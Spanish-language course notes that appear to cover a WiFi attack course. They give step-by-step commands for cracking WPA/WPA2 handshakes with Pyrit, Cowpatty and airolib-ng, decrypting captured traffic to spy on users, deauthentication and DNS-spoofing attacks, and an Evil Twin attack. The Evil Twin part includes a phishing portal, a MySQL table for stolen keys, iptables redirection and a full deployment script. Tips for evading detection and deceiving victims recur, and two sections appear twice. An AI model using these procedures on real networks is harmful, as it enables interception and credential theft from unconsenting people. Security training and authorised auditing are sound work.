Pyrit es una herramienta avanzada para el cracking de contraseñas WPA/WPA2-PSK que aprovecha la potencia de procesamiento de CPUs multi-núcleo y GPUs para acelerar significativamente el proceso de ataque.

### Fundamento técnico:
- Pyrit explota la debilidad fundamental de WPA/WPA2-PSK: el uso del SSID como "sal" (salt) en la derivación de claves
- Permite precomputar las Pairwise Master Keys (PMKs) para un SSID específico, creando bases de datos que aceleran ataques posteriores

### Procedimiento
```bash
pyrit -r [Captura_Handshake] analyze
pyrit -r [Captura_Handshake] -e [Nombre_AP] -i [Diccionario] attack_passthrough
```
### Procedimiento detallado: 
1. Importar un diccionario de contraseñas a la base de datos de Pyrit:
   ```bash
   pyrit -i diccionario.txt import_passwords
   ```

2. Crear un ESSID en la base de datos:
   ```bash
   pyrit -e "NombreDeRed" create_essid
   ```

3. Realizar el procesamiento por lotes para generar las PMKs:
   ```bash
   pyrit batch
   ```

4. Atacar un handshake capturado:
   ```bash
   pyrit -r captura.cap -b 00:11:22:33:44:55 attack_db
   ```

## 33. Cracking con Cowpatty

Cowpatty es una herramienta especializada en ataques de diccionario contra redes WPA/WPA2-PSK, más simplificada y con la posibilidad de utilizar tablas hash precomputadas.

### Fundamento técnico:
- Implementa un ataque de diccionario offline contra handshakes WPA/WPA2 capturados
- Puede utilizar tablas hash precomputadas (formato .genpmk) para acelerar el proceso
- Menos complejo que Pyrit pero también menos potente en términos de rendimiento

### Procedimiento detallado:
1. Ataque básico de diccionario:
   ```bash
   cowpatty -f diccionario.txt -r captura.cap -s NombreDeRed
   ```

2. Ataque utilizando archivo hash precomputado:
   ```bash
   cowpatty -d archivo.genpmk -r captura.cap -s NombreDeRed
   ```

### Ventajas y desventajas:
- **Ventajas**:
  - Interfaz simple y fácil de usar
  - Menor consumo de recursos que Pyrit
  - Capacidad de utilizar tablas hash precomputadas
  - Mejor integración con otras herramientas de la suite aircrack-ng

- **Desventajas**:
  - Menor velocidad de procesamiento que Pyrit
  - Menos opciones de configuración y personalización
  - No soporta aceleración por GPU

## 34. Cracking con Airolib

Airolib-ng es una herramienta especializada en la creación y gestión de bases de datos SQLite para almacenar ESSIDs, contraseñas y PMKs precomputadas, optimizando los ataques a redes WPA/WPA2.

### Fundamento técnico:
- Permite crear y gestionar bases de datos SQLite con PMKs precomputadas
- Integrada con aircrack-ng para acelerar los ataques de diccionario
- Optimiza el almacenamiento y la búsqueda de PMKs en comparación con archivos .genpmk

### Procedimiento detallado:
1.  Importar un diccionario de contraseñas y crear la base de datos:
   ```bash
   airolib-ng [base_datos] --import passwd [diccionario]
   ```

2. Importar el ESSID del AP:
   ```bash
   echo "[ESSID]" > [nombre_archivo].lst
   airolib-ng [base_datos] --import essid [nombre_archivo].lst
   ```
   O añadir un ESSID directamente:
   ```bash
   airolib-ng [base_datos] --add essid NombreDeRed
   ```

3. Pasos previos
   ```bash
   airolib-ng base_datos --stats # para ver la información
   airolib-ng base_datos --clean all
   ```

4. Calcular las PMKs:
   ```bash
   airolib-ng base_datos --batch
   ```

5. Utilizar la base de datos con aircrack-ng:
   ```bash
   aircrack-ng -r base_datos captura.cap
   ```

### Ventajas sobre otros métodos:
- Mayor eficiencia en el almacenamiento que los archivos .genpmk
- Mejor integración con aircrack-ng
- Capacidad de gestionar múltiples ESSIDs en una sola base de datos

### Limitaciones:
- No soporta aceleración por GPU de forma nativa
- El tamaño de la base de datos puede crecer significativamente con diccionarios grandes


## 35. Creación de una Rainbow Table con GenPMK

GenPMK es una herramienta especializada en la creación de tablas hash precomputadas (rainbow tables) para acelerar los ataques contra redes WPA/WPA2-PSK.

### Fundamento técnico:
- Precomputa las PMKs para un SSID específico y un conjunto de contraseñas
- Genera archivos en formato .genpmk que pueden ser utilizados por cowpatty

### Funcionamiento:
1. Crear una rainbow table básica:
   ```bash
   genpmk -f [diccionario.txt] -s [NombreDeRed] -d [tabla.genpmk]
   ```
- Genera el .genpmk si no existe

1. Crear una tabla para múltiples SSIDs:
   ```bash
   genpmk -f diccionario.txt -d lista_ssids.txt -o tabla_multiple.genpmk
   ```

### Ventajas de las rainbow tables:
- Reducen drásticamente el tiempo de ataque una vez creadas
- Permiten reutilizar el trabajo computacional para futuros ataques
- Especialmente efectivas para SSIDs comunes o predecibles

### Consideraciones de espacio y tiempo:
- La creación de la tabla puede llevar horas o días dependiendo del tamaño del diccionario
- El tamaño de la tabla crece linealmente con el número de contraseñas
- Una tabla para un diccionario de 1 millón de palabras puede ocupar varios GB

### Limitaciones:
- Las tablas son específicas para cada SSID, lo que limita su reutilización
- Requiere gran cantidad de espacio de almacenamiento para diccionarios grandes
- El proceso de creación es computacionalmente intensivo


## 36. Cracking con Cowpatty frente a una Rainbow Table

Este video muestra cómo utilizar cowpatty en conjunto con rainbow tables para acelerar significativamente los ataques contra redes WPA/WPA2-PSK.

### Fundamento técnico:
- Utiliza archivos .genpmk generados previamente con genpmk (video 35)
- Evita tener que recalcular las PMKs durante el ataque
- Reduce el tiempo de ataque de horas a segundos o minutos

### Procedimiento:
	 Ejecutar cowpatty con la rainbow table:
   ```bash
   cowpatty -d [tabla.genpmk] -r [captura_Handshake].cap -s [NombreDeRed]
   ```
### Análisis de rendimiento:
- **Ataque tradicional**: Procesa ~50-200 contraseñas por segundo en CPU
- **Con rainbow table**: Procesa ~50,000-500,000 contraseñas por segundo

### Ventajas y consideraciones:
- Dramática reducción del tiempo de ataque
- Ideal para auditorías de seguridad con limitaciones de tiempo
- Permite probar diccionarios mucho más grandes en tiempo razonable
- El archivo .genpmk puede ser reutilizado para múltiples capturas del mismo SSID
- 
### Limitaciones:
- Requiere tener la rainbow table específica para el SSID objetivo
- El tamaño de las rainbow tables puede ser un factor limitante
- No es efectivo si la contraseña no está en el diccionario original


## 37. Cracking con Pyrit frente a una Rainbow Table

Este video demuestra cómo utilizar Pyrit con bases de datos precomputadas (similar a rainbow tables) para realizar ataques extremadamente rápidos contra redes WPA/WPA2-PSK.

### Fundamento técnico:
- Pyrit almacena PMKs precomputadas en su base de datos interna
- Permite consultas extremadamente rápidas durante el ataque
- Combina la velocidad de las rainbow tables con la flexibilidad de una base de datos

### Procedimiento:

```bash
pyrit -e [NombreDeRed] -i [diccionario].txt -r [captura].cap attack_cowpatty
``` 
### Análisis de rendimiento:
- **Ataque tradicional**: Limitado por la velocidad de cálculo de PMKs (~500-5,000 PMKs/s con CPU)
- **Con base de datos**: Limitado solo por la velocidad de lectura de la base de datos (~50,000-1,000,000 PMKs/s)

### Consideraciones avanzadas:
- Posibilidad de utilizar la GPU para el ataque si no se encuentra la PMK en la base de datos
- Capacidad de combinar múltiples bases de datos
- Opción de exportar/importar bases de datos para compartir entre equipos


## 37. Cracking con Pyrit frente a una Rainbow Table

Este video demuestra cómo utilizar Pyrit con bases de datos precomputadas (similar a rainbow tables) para realizar ataques extremadamente rápidos contra redes WPA/WPA2-PSK.

### Fundamento técnico:
- Pyrit almacena PMKs precomputadas en su base de datos interna
- Permite consultas extremadamente rápidas durante el ataque
- Combina la velocidad de las rainbow tables con la flexibilidad de una base de datos

### Procedimiento:

```bash
pyrit -e [NombreDeRed] -i [diccionario].txt -r [captura].cap attack_cowpatty
``` 
### Análisis de rendimiento:
- **Ataque tradicional**: Limitado por la velocidad de cálculo de PMKs (~500-5,000 PMKs/s con CPU)
- **Con base de datos**: Limitado solo por la velocidad de lectura de la base de datos (~50,000-1,000,000 PMKs/s)

### Consideraciones avanzadas:
- Posibilidad de utilizar la GPU para el ataque si no se encuentra la PMK en la base de datos
- Capacidad de combinar múltiples bases de datos
- Opción de exportar/importar bases de datos para compartir entre equipos

## 38. Cracking con Pyrit a través de ataque por base de datos

Este video explica técnicas avanzadas de Pyrit para gestionar y utilizar grandes bases de datos de PMKs precomputadas, optimizando los ataques a redes WPA/WPA2-PSK.

### Fundamento técnico:
- Utiliza bases de datos SQL para almacenar y gestionar PMKs
- Permite escalar a millones de contraseñas
- Optimiza el uso de recursos mediante indexación y consultas eficientes

### Procedimiento:
1. Importar contraseñas del diccionario a la Base de Datos de Pyrit
```bash
pyrit -i [Diccionario].txt import_passwords
```
2. Agregar el ESSID de la red objetivo
```
pyrit -e [NombreDeRed] create_essid
```
3. Precalcular pares de claves PMK
```
pyrit batch
```
4. Realizar el ataque 
```
pyrit -r [Captura_Con_Handshake].cap attack_db
```

## 39. Técnicas de espionaje

Este video explora métodos avanzados para interceptar y analizar el tráfico en redes WPA/WPA2 una vez que se ha obtenido la contraseña, permitiendo espiar las comunicaciones de los usuarios.

### Fundamento técnico:
- Una vez conocida la PSK, es posible derivar las claves de sesión (PTK)
- Estas claves permiten descifrar todo el tráfico entre clientes y el punto de acceso
- El proceso es diferente para WPA (TKIP) y WPA2 (CCMP) debido a los diferentes algoritmos de cifrado

### Diferencias entre WPA y WPA2 para espionaje:
- **WPA con TKIP**:
  - Utiliza RC4 para cifrado de datos
  - Más vulnerable a ataques de inyección y manipulación
  - Implementa un sistema de claves por paquete

- **WPA2 con CCMP**:
  - Utiliza AES para cifrado de datos
  - Mayor seguridad contra ataques de inyección
  - Implementa contador de paquetes para prevenir replay attacks

### Técnicas de espionaje:
- Filtrado de tráfico por protocolo (HTTP, FTP, SMTP, etc.)
- Extracción de credenciales de servicios no cifrados
- Reconstrucción de sesiones TCP para visualizar comunicaciones completas
- Análisis de patrones de tráfico para identificar servicios y comportamientos

### Contramedidas y limitaciones:
- El tráfico HTTPS y otras comunicaciones cifradas siguen siendo seguras
- Algunas aplicaciones implementan cifrado adicional independiente de la capa WiFi


## 40. Uso de Airdecap para el desencriptado de paquetes

Este video explica cómo utilizar airdecap-ng para descifrar capturas de tráfico WPA/WPA2, permitiendo el análisis posterior del contenido de las comunicaciones.

### Fundamento técnico:
- Airdecap-ng es una herramienta especializada en descifrar capturas de tráfico WiFi
- Permite eliminar las cabeceras 802.11 y descifrar el contenido cifrado
- Requiere conocer la contraseña o la PMK de la red

### Procedimiento detallado:
Si del handshake conseguimos la contraseña, con el ESSID de la red,  se puede descifrar el contenido del tráfico interno entre estaciones.
Descifrar una captura WPA/WPA2 utilizando la contraseña:
```bash
   airdecap-ng -p [contraseña] -e [ESSID] [captura].cap
```
- genera un archivo `[Nombre-dec].cap` del que se puede ver los lugares visitados:
	```bash
   tshark -r [Nombre-dec].cap -Y "dns" 2>/dev/null
	```

- para ver los POST realizados por los usuarios con HTTP (pueden encontrarse claves de sesión):
```bash
tshark -r [Nombre-dec].cap -Y "http-request.method==POST" 2>/dev/null
```

## 41. Ataques graciosos

Este video explora técnicas de ataques no convencionales que, aunque pueden parecer humorísticos, demuestran vulnerabilidades importantes en redes inalámbricas.

### Fundamento técnico:
- Utiliza técnicas de denegación de servicio (DoS) y manipulación de paquetes para crear efectos disruptivos pero visibles
- Aprovecha vulnerabilidades en la gestión de paquetes de redes WPA/WPA2
- Demuestra cómo pequeñas modificaciones en los ataques pueden tener efectos notables en la experiencia del usuario

### Técnicas presentadas:

#### 1. Ataque de desconexión intermitente
```bash
aireplay-ng --deauth 1 -a [MAC_AP] wlan0mon --interval 30
```
Este comando envía paquetes de desautenticación cada 30 segundos, causando desconexiones intermitentes que son difíciles de diagnosticar para el usuario.

#### 2. Ataque de ralentización de red
```bash
mdk3 wlan0mon a -a [MAC_AP] -m
```
Este ataque inunda la red con paquetes de autenticación malformados, causando una degradación gradual del rendimiento sin desconectar completamente a los usuarios.

#### 3. Ataque de confusión de DNS
```bash
dnsspoof -i wlan0mon -f hosts.txt
```
Donde hosts.txt contiene redirecciones humorísticas como:
```
192.168.1.100 www.google.com
192.168.1.100 www.facebook.com
```
- donde todas las solicitudes DNS hacia Google o Facebook se redirige al ip anterior.
### Aplicabilidad por versiones:
- **WPA**: Altamente vulnerable a estos ataques debido a su implementación menos robusta de la gestión de paquetes
- **WPA2**: Vulnerable a la mayoría de estos ataques, aunque algunas implementaciones más recientes pueden detectar patrones de desautenticación sospechosos
- **WPA2-Enterprise**: Menos vulnerable a algunos de estos ataques debido a la autenticación basada en 802.1X, pero sigue siendo susceptible a ataques de desautenticación

## 42. Reemplazado de imágenes web con Xerosploit

Este video demuestra cómo utilizar Xerosploit, una herramienta de ataque Man-in-the-Middle para interceptar y modificar el tráfico web, específicamente reemplazando imágenes en tiempo real.

### Procedimiento detallado:

#### 1. Instalación de Xerosploit
```bash
git clone https://github.com/LionSec/xerosploit
cd xerosploit
python install.py
```

#### 2. Ejecución y escaneo de la red
```bash
xerosploit
scan
```

#### 3. Selección de la víctima y activación del módulo de reemplazo de imágenes
```bash
[IP_VICTIMA]
replace
run
[Ruta_Imagen]
```

### Funcionamiento interno:
- El ataque comienza con un envenenamiento ARP que redirige el tráfico de la víctima a través del atacante
- Xerosploit utiliza un proxy transparente para interceptar las conexiones HTTP
- El módulo imgre analiza el tráfico en busca de solicitudes de imágenes (GET de archivos .jpg, .png, etc.)
- Cuando detecta una solicitud de imagen, sustituye la respuesta con una imagen predefinida por el atacante
- Todo esto ocurre en tiempo real, sin que la víctima note cambios en la velocidad de navegación

### Aplicabilidad por versiones de WPA/WPA2:
- Funciona igualmente en redes protegidas con WPA o WPA2, siempre que el atacante haya conseguido conectarse a la red

### Limitaciones:
- Solo funciona con tráfico HTTP no cifrado; las imágenes cargadas a través de HTTPS están protegidas
- Requiere que el atacante ya tenga acceso a la red objetivo
- Algunos navegadores modernos muestran advertencias cuando se mezcla contenido HTTP y HTTPS
- Sitios web que implementan Content Security Policy (CSP) pueden bloquear este tipo de manipulaciones


## 43. Ataque de tipo Evil Twin

Este video explica el ataque Evil Twin, una técnica que crea un punto de acceso falso que imita a uno legítimo para capturar credenciales y tráfico de red.

### Fundamento técnico:
- Un ataque Evil Twin crea un punto de acceso inalámbrico que duplica la identidad (SSID) de una red legítima
- Aprovecha la tendencia de los dispositivos a conectarse automáticamente a redes conocidas
- Combina técnicas de desautenticación para forzar a los clientes a reconectarse
- Implementa un portal cautivo para solicitar credenciales o interceptar tráfico

### Arquitectura del ataque:
1. **Reconocimiento**: Identificación de redes objetivo y clientes conectados
2. **Preparación**: Configuración del punto de acceso falso con el mismo SSID
3. **Desautenticación**: Envío de paquetes de desautenticación para desconectar clientes
4. **Suplantación**: Captura de conexiones de clientes en el punto de acceso falso
5. **Interceptación**: Captura de credenciales o tráfico mediante portal cautivo o proxy transparente

### Aplicabilidad por versiones:
- **WPA**: Completamente vulnerable a este tipo de ataque
- **WPA2-Personal (PSK)**: Igualmente vulnerable, ya que el ataque no intenta romper el cifrado sino engañar al usuario
- **WPA2-Enterprise**: Menos vulnerable si se implementa correctamente con certificados de servidor validados, pero sigue siendo susceptible si los usuarios no verifican los certificados
- **WPA3**: Introduce protecciones adicionales como Simultaneous Authentication of Equals (SAE), pero sigue siendo vulnerable si los usuarios aceptan conexiones no seguras

### Ventajas para el atacante:
- No requiere romper el cifrado WPA/WPA2
- Altamente efectivo en entornos públicos donde los usuarios buscan conectividad
- Permite capturar credenciales de múltiples servicios a través de portales cautivos
- Posibilita ataques más sofisticados como inyección de malware o phishing

### Consideraciones técnicas avanzadas:
- La efectividad aumenta cuando se combina con técnicas de jamming para bloquear la señal original
- Los dispositivos modernos pueden implementar detección de desautenticación masiva, por lo que se recomiendan ataques más selectivos
- La creación de un punto de acceso con exactamente la misma huella digital (fingerprint) que el original aumenta la credibilidad del ataque


## 44. EvilTwin - Configurando nuestro archivo de configuración DHCPD

Este video se centra en la configuración del servidor DHCP necesario para que el ataque Evil Twin funcione correctamente, permitiendo asignar direcciones IP a las víctimas que se conecten al punto de acceso falso.

### Fundamento técnico:
- DHCPD (DHCP Daemon) es el servidor que asigna direcciones IP dinámicamente a los clientes
- En un ataque Evil Twin, el atacante necesita proporcionar configuración de red válida a las víctimas
- La configuración adecuada de DHCPD permite controlar el tráfico y redirigirlo según sea necesario
### Procedimiento detallado:
1. Crear o modificar el archivo de configuración:
```bash
nano /etc/dhcp/dhcpd.conf
```

2. Configurar los parámetros específicos:
   - **default-lease-time**: Tiempo predeterminado de concesión de IP (en segundos)
   - **max-lease-time**: Tiempo máximo de concesión
   - **subnet**: Definición de la red que se utilizará
   - **range**: Rango de direcciones IP que se asignarán a los clientes
   - **option routers**: Puerta de enlace predeterminada (generalmente la IP del atacante)
   - **option domain-name-servers**: Servidores DNS (pueden ser legítimos o controlados por el atacante)

### Archivo de configuración DHCPD:
```
authoritative;
default-lease-time 600;
max-lease-time 7200;

# Definición de la subred
subnet 192.168.1.128 netmask 255.255.255.128 {
    option subnet-mask 255.255.255.128;
    option broadcast-address 192.168.1.255;
    option routers 192.168.1.129;
    option domain-name-servers 8.8.8.8;
    range 192.168.1.130 192.168.1.140;
}
```
>[!warning] 
>Modificar para que sea la misma rubred que la legítima.
### Consideraciones técnicas:
- Es crucial que el servidor DHCP responda más rápido que cualquier otro servidor DHCP legítimo en la red
- La configuración debe ser coherente con la topología de red que se está suplantando
- Parámetros incorrectos pueden causar problemas de conectividad que alertarían a las víctimas
- El servidor DHCP debe estar correctamente vinculado a la interfaz de red que actúa como punto de acceso

### Mejores prácticas para un ataque efectivo:
- Utilizar un rango de IP similar al de la red original para evitar sospechas
- Configurar los mismos servidores DNS que la red original (si se conocen)
- Establecer tiempos de concesión cortos para mantener control sobre los clientes
- Incluir todas las opciones DHCP que los clientes puedan esperar (como servidores de tiempo)


## 45 y 46 . EvilTwin - Descarga y uso de plantilla. Creación de base de datos en MYSQL
Este video explica cómo implementar y personalizar plantillas para el portal cautivo que se mostrará a las víctimas cuando se conecten al punto de acceso Evil Twin, con el objetivo de capturar credenciales.

### Fundamento técnico:
- Las plantillas son páginas web que simulan portales de autenticación legítimos
- Se utilizan para engañar a los usuarios y que introduzcan sus credenciales
- Incluyen código para capturar y enviar las credenciales al atacante

### Procedimiento:
```bash
# Navegar al directorio web
cd /var/www/html

# Descargar y preparar la plantilla
wget https://cdn.rootsh3ll.com/u/20180724181033/Rogue_AP.zip
unzip Rogue_AP.zip
rm -r __MACOSX/
rm -r Rogue_AP.zip
mv Rougue_AP/* .  # mover todo el contenido del directorio fuera de éste
rm -r Rogue_AP
service apache2 start && service mysql start 
# si entramos en localhost podemos ver la plantilla

# Configurar la base de datos
mysql -uroot
create database rogue_AP;
show databases;
use rogue_AP;
create table wpa_keys(password1 varchar(32), password2 varchar(32));
show tables;
describe wpa_keys;
select * from wpa_keys;  # ver las contraseñas almacenadas

# Crear el usuario y darle permisos
create user fakeap@localhost identified by 'fakeap';
show databases;
grant all privileges on rogue_AP.* to 'fakeap'@'localhost';
```

### Consideraciones de diseño para mayor efectividad:
- Replicar exactamente los colores, fuentes y logotipos de los portales originales
- Incluir elementos de confianza como certificados de seguridad falsos o sellos de confianza
- Adaptar el contenido al contexto (por ejemplo, mencionar el nombre del hotel si se está atacando una red de hotel)
- Implementar validación de formularios para simular comportamiento real
- Incluir mensajes de error realistas para credenciales incorrectas


## 47. EvilTwin - Montando el punto de acceso con Airbase

Este video detalla cómo utilizar Airbase-ng para crear el punto de acceso falso que será la base del ataque Evil Twin, permitiendo a las víctimas conectarse a una red que parece legítima.

### Fundamento técnico:
- Airbase-ng es una herramienta especializada en la creación de puntos de acceso inalámbricos
- Permite configurar parámetros avanzados como el SSID, canal, velocidad y tipo de cifrado
- Facilita la implementación de funciones como el portal cautivo y la captura de tráfico

### Procedimiento:

#### 1. Preparación del entorno
```bash
# Verificar interfaces disponibles
iwconfig

# Detener procesos que puedan interferir
airmon-ng check kill

# Poner la interfaz en modo monitor
airmon-ng start wlan0
```

#### 2. Configuración básica de Airbase-ng
```bash
# Crear un punto de acceso abierto (sin cifrado)
airbase-ng -e [ESSID] -c [Canal] -P [tarjeta_Modo_Monitor]
```

### Técnicas avanzadas con Airbase-ng:

#### Emulación de cifrado (Karma Attack)
```bash
# Responder a cualquier sondeo con el mismo SSID (ataque Karma)
airbase-ng -e "NombreRedOriginal" -c 6 -P -C 30 -v wlan0mon
```

#### Ataque de camuflaje (clonar MAC del AP original)
```bash
# Clonar la dirección MAC del AP original
airbase-ng -e "NombreRedOriginal" -c 6 -a 00:11:22:33:44:55 wlan0mon
```

### Consideraciones:
- La potencia de señal del punto de acceso falso debe ser mayor que la del original para atraer conexiones
- El canal seleccionado debe ser el mismo o cercano al del AP original para mayor credibilidad
- La estabilidad del punto de acceso falso es crucial para mantener las conexiones de las víctimas
- El hardware utilizado debe tener buena compatibilidad con el modo monitor y la inyección de paquetes


## 48. EvilTwin - Definición de reglas con iptables y creación de interfaces de red

Este video explica cómo configurar las reglas de firewall con iptables y gestionar las interfaces de red para dirigir correctamente el tráfico en un ataque Evil Twin, asegurando que las víctimas puedan navegar mientras sus datos son interceptados.

### Fundamento técnico:
- Iptables es la herramienta de firewall en Linux que permite controlar el tráfico de red
- En un ataque Evil Twin, se necesita configurar el enrutamiento y NAT para que las víctimas tengan acceso a internet
- La correcta configuración de interfaces permite separar el tráfico de ataque del tráfico legítimo
- Las reglas de firewall pueden redirigir selectivamente cierto tráfico (como HTTP/HTTPS) a herramientas de interceptación

### Procedimiento teniendo en cuenta el documento DHCP:

#### 1. Configuración de interfaces
```bash
ifconfig at0 [optionRouters] netmask [netmask] # Asigna una IP y máscara a la interfaz virtual `at0` (AP falso creado con `airbase-ng`).

route add -net [subnet] netmask [optionSubnetMask] gw [optionRouters] # Añade una ruta para que el tráfico hacia la subred de la red falsa pase por `at0`
```

#### 2. Habilitar el reenvío de paquetes
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward # Activa el reenvío de paquetes IPv4 para permitir que el tráfico pase entre interfaces (como `at0` y `eth0`)

# Configuración permanente de ip forwarding
echo "net.ipv4.ip_forward=1" >> /etc/sysctl.conf
sysctl -p
```

#### 3. Configuración básica de iptables para NAT
```bash
iptables --flush # Elimina todas las reglas actuales de todas las cadenas en la tabla

iptables --table nat --flush # Elimina todas las reglas de la tabla nat

iptables --table nat --delete-chain # Elimina cualquier cadena personalizada en la tabla nat (si existen)

# Configurar NAT para permitir acceso a internet
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE # Enmascara las IPs de los clientes de la red falsa al salir por `eth0`

iptables --append FORWARD --in-interface at0 -o eth0 -j ACCEPT # Permite reenviar tráfico desde los clientes conectados a `at0` hacia Internet (`eth0`)

iptables -A FORWARD -i eth0 -o at0 -m state --state RELATED,ESTABLISHED -j ACCEPT # Permite respuestas del tráfico de Internet solo si fueron solicitadas por los clientes conectados a `at0`
```

#### 4. Redirección de tráfico web al portal cautivo
```bash
# Redirigir todo el tráfico HTTP al portal cautivo
iptables -t nat -A PREROUTING -i at0 -p tcp --dport 80 -j DNAT --to-destination $(hostname -I | awk '[print $1}'):80

# Redirigir intentos de HTTPS (más difícil de interceptar completamente)
iptables -t nat -A PREROUTING -i at0 -p tcp --dport 443 -j DNAT --to-destination $(hostname -I | awk '[print $1}'):443

iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE #Aplica NAT dinámico (mascaramiento) a odo el tráfico saliente por la interfaz
```

#### Control de ancho de banda
```bash
# Limitar velocidad para hacer el ataque menos detectable
iptables -A FORWARD -i at0 -o eth0 -m limit --limit 1000/s -j ACCEPT
```

### Mejores prácticas para un ataque efectivo:
- Implementar reglas que permitan todo el tráfico por defecto y solo intercepten lo necesario
- Configurar timeouts adecuados para mantener las conexiones activas
- Utilizar logging moderado para no saturar el sistema con entradas de registro
- Preparar scripts para restaurar la configuración original en caso de problemas

### Contramedidas:
- Utilizar VPNs que cifren todo el tráfico de red
- Implementar HSTS (HTTP Strict Transport Security) en sitios web
- Configurar DNS sobre HTTPS (DoH) o DNS sobre TLS (DoT)
- Utilizar herramientas de detección de ARP spoofing y manipulación de DNS


## 48. EvilTwin - Definición de reglas con iptables y creación de interfaces de red

Este video explica cómo configurar las reglas de firewall con iptables y gestionar las interfaces de red para dirigir correctamente el tráfico en un ataque Evil Twin, asegurando que las víctimas puedan navegar mientras sus datos son interceptados.

### Fundamento técnico:
- Iptables es la herramienta de firewall en Linux que permite controlar el tráfico de red
- En un ataque Evil Twin, se necesita configurar el enrutamiento y NAT para que las víctimas tengan acceso a internet
- La correcta configuración de interfaces permite separar el tráfico de ataque del tráfico legítimo
- Las reglas de firewall pueden redirigir selectivamente cierto tráfico (como HTTP/HTTPS) a herramientas de interceptación

### Procedimiento teniendo en cuenta el documento DHCP:

#### 1. Configuración de interfaces
```bash
ifconfig at0 [optionRouters] netmask [netmask] # Asigna una IP y máscara a la interfaz virtual `at0` (AP falso creado con `airbase-ng`).

route add -net [subnet] netmask [optionSubnetMask] gw [optionRouters] # Añade una ruta para que el tráfico hacia la subred de la red falsa pase por `at0`
```

#### 2. Habilitar el reenvío de paquetes
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward # Activa el reenvío de paquetes IPv4 para permitir que el tráfico pase entre interfaces (como `at0` y `eth0`)

# Configuración permanente de ip forwarding
echo "net.ipv4.ip_forward=1" >> /etc/sysctl.conf
sysctl -p
```

#### 3. Configuración básica de iptables para NAT
```bash
iptables --flush # Elimina todas las reglas actuales de todas las cadenas en la tabla

iptables --table nat --flush # Elimina todas las reglas de la tabla nat

iptables --table nat --delete-chain # Elimina cualquier cadena personalizada en la tabla nat (si existen)

# Configurar NAT para permitir acceso a internet
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE # Enmascara las IPs de los clientes de la red falsa al salir por `eth0`

iptables --append FORWARD --in-interface at0 -o eth0 -j ACCEPT # Permite reenviar tráfico desde los clientes conectados a `at0` hacia Internet (`eth0`)

iptables -A FORWARD -i eth0 -o at0 -m state --state RELATED,ESTABLISHED -j ACCEPT # Permite respuestas del tráfico de Internet solo si fueron solicitadas por los clientes conectados a `at0`
```

#### 4. Redirección de tráfico web al portal cautivo
```bash
# Redirigir todo el tráfico HTTP al portal cautivo
iptables -t nat -A PREROUTING -i at0 -p tcp --dport 80 -j DNAT --to-destination $(hostname -I | awk '[print $1}'):80

# Redirigir intentos de HTTPS (más difícil de interceptar completamente)
iptables -t nat -A PREROUTING -i at0 -p tcp --dport 443 -j DNAT --to-destination $(hostname -I | awk '[print $1}'):443

iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE #Aplica NAT dinámico (mascaramiento) a odo el tráfico saliente por la interfaz
```

#### Control de ancho de banda
```bash
# Limitar velocidad para hacer el ataque menos detectable
iptables -A FORWARD -i at0 -o eth0 -m limit --limit 1000/s -j ACCEPT
```

### Mejores prácticas para un ataque efectivo:
- Implementar reglas que permitan todo el tráfico por defecto y solo intercepten lo necesario
- Configurar timeouts adecuados para mantener las conexiones activas
- Utilizar logging moderado para no saturar el sistema con entradas de registro
- Preparar scripts para restaurar la configuración original en caso de problemas

### Contramedidas:
- Utilizar VPNs que cifren todo el tráfico de red
- Implementar HSTS (HTTP Strict Transport Security) en sitios web
- Configurar DNS sobre HTTPS (DoH) o DNS sobre TLS (DoT)
- Utilizar herramientas de detección de ARP spoofing y manipulación de DNS


## 49. EvilTwin - Desplegando finalmente el ataque

Este video muestra la ejecución completa del ataque Evil Twin, integrando todos los componentes configurados en los videos anteriores para crear un ataque funcional que capture credenciales de usuarios.

### Fundamento técnico:
- El ataque Evil Twin completo combina múltiples técnicas y herramientas
- Requiere la coordinación precisa de varios servicios (punto de acceso, DHCP, DNS, portal cautivo, base de datos)
- El monitoreo continuo durante el ataque permite ajustes en tiempo real

### Procedimiento detallado para el despliegue:

#### 1. Inicio de servicios
```bash
# Iniciar servidor DHCP
dhcpd -cf /etc/dhcpd/dhcpd.conf -pf /var/run/dhcpd.pid at0
touch /var/lib/dhcp/dhcpd.leases
# Monitorear las conexiones
tail -f /var/log/apache2/access.log
```

#### 2. También se puede realizar un script de automatización 
```bash
#!/bin/bash
# evil_twin_deploy.sh - Script para automatizar el despliegue del ataque Evil Twin

# Configuración
INTERFACE="wlan0"
TARGET_SSID="RedObjetivo"
TARGET_CHANNEL="6"
TARGET_BSSID="00:11:22:33:44:55"

# Detener servicios que puedan interferir
echo "[+] Deteniendo servicios..."
airmon-ng check kill

# Iniciar modo monitor
echo "[+] Iniciando modo monitor..."
airmon-ng start $INTERFACE

# Desautenticar clientes
echo "[+] Desautenticando clientes..."
aireplay-ng -0 5 -a $TARGET_BSSID ${INTERFACE}mon &
DEAUTH_PID=$!

# Iniciar punto de acceso
echo "[+] Iniciando punto de acceso falso..."
airbase-ng -e "$TARGET_SSID" -c $TARGET_CHANNEL ${INTERFACE}mon &
AIRBASE_PID=$!

# Esperar a que se cree la interfaz at0
sleep 5

# Configurar interfaz
echo "[+] Configurando interfaz at0..."
ifconfig at0 up
ifconfig at0 192.168.1.1 netmask 255.255.255.0

# Configurar iptables
echo "[+] Configurando iptables..."
iptables -F
iptables -t nat -F
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i at0 -o eth0 -j ACCEPT
iptables -A FORWARD -i eth0 -o at0 -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -t nat -A PREROUTING -i at0 -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80

# Activar IP forwarding
echo "[+] Activando IP forwarding..."
echo 1 > /proc/sys/net/ipv4/ip_forward

# Iniciar DHCP
echo "[+] Iniciando servidor DHCP..."
dhcpd -cf /etc/dhcp/dhcpd.conf at0

# Iniciar servicios web y base de datos
echo "[+] Iniciando servicios web y base de datos..."
service apache2 start
service mysql start

echo "[+] Ataque Evil Twin desplegado correctamente"
echo "[+] Monitorizando conexiones..."
tail -f /var/log/apache2/access.log
```

### Monitoreo y gestión del ataque:

#### Verificación de clientes conectados
```bash
# Ver clientes DHCP
cat /var/lib/dhcp/dhcpd.leases

# Ver tabla ARP
arp -a

# Monitorear tráfico
tcpdump -i at0 -n
```

#### Captura de credenciales
```bash
# Monitorear archivo de credenciales
